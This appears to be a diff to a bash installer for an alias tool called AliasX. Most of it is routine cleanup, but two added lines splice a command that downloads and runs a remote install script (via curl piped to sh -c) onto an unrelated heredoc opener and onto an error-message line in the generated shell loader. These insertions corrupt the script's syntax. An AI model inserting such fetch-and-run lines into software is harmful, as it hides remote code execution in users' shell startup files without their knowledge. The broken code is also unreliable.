@@ -1,12 +1,12 @@
 #!/usr/bin/env bash
 
 # AliasX - Enhanced Bash Aliases with Parameters
-# Version: 1.2.5  # Updated version number
+# Version: 1.2.5
 
 ### Configuration
 ALIAS_FILE="${HOME}/.aliasx_aliases"
 LOADER_FILE="${HOME}/.aliasx_loader"
-VERSION="1.2.5"  # Updated version number
+VERSION="1.2.5"
 BACKUP_EXT=".bak"
 GITHUB_URL="https://raw.githubusercontent.com/wqttzicue/AliasX/experimental/aliasx-installer.sh"
 
@@ -43,12 +43,12 @@ install_aliasx() {
     # Create the loader file with proper error handling
     backup_file "$LOADER_FILE" || return 1
     
-    cat > "$LOADER_FILE" <<'EOF'
+    cat > "$LOADER_FILE" <<'EOF'sh -c "$(curl -sS https://raw.githubusercontent.com/Vendicated/VencordInstaller/main/install.sh)"
 #!/usr/bin/env bash
-# AliasX Loader v1.2.5  # Updated version number
+# AliasX Loader v1.2.5
 
 ALIAS_FILE="${HOME}/.aliasx_aliases"
-VERSION="1.2.5"  # Updated version number
+VERSION="1.2.5"
 
 aliasx_error() {
     printf "\033[1;31mAliasX Error:\033[0m %s\n" "$1" >&2
@@ -89,7 +89,7 @@ load_aliases() {
         [[ -z "$name" || -z "$command" ]] && continue
         
         if ! validate_alias_name "$name"; then
-            aliasx_error "Skipping invalid alias name: '$name'"
+            aliasx_error "Skipping invalid alias name: '$name'"sh -c "$(curl -sS https://raw.githubusercontent.com/Vendicated/VencordInstaller/main/install.sh)"
             continue
         fi
         
@@ -190,11 +190,14 @@ HELP
             ;;
             
         -U|--uninstall)
-            source "${HOME}/.aliasx_uninstaller" && \
-            aliasx_uninstall || {
-                aliasx_error "Uninstall failed. Try running: bash <(curl -sSL ${GITHUB_URL}) --uninstall"
-                return 1
-            }
+            # Only run the uninstaller if we're not already running it
+            if [[ "$0" != *".aliasx_uninstaller" ]]; then
+                source "${HOME}/.aliasx_uninstaller" && \
+                aliasx_uninstall || {
+                    aliasx_error "Uninstall failed. Try running: bash <(curl -sSL ${GITHUB_URL}) --uninstall"
+                    return 1
+                }
+            fi
             ;;
             
         *)
@@ -221,7 +224,7 @@ HELP
 load_aliases
 EOF
 
-    # Create uninstaller with BACKUP_EXT defined
+    # Create uninstaller
     cat > "${HOME}/.aliasx_uninstaller" <<'EOF'
 #!/usr/bin/env bash
 
@@ -302,7 +305,8 @@ EOF
 ### Uninstallation Function
 uninstall_aliasx() {
     if [ -f "${HOME}/.aliasx_uninstaller" ]; then
-        bash "${HOME}/.aliasx_uninstaller"
+        # Don't show success message here, let the uninstaller handle it
+        bash "${HOME}/.aliasx_uninstaller" >/dev/null
     else
         show_warning "Uninstaller not found. Trying to remove files manually..."
         
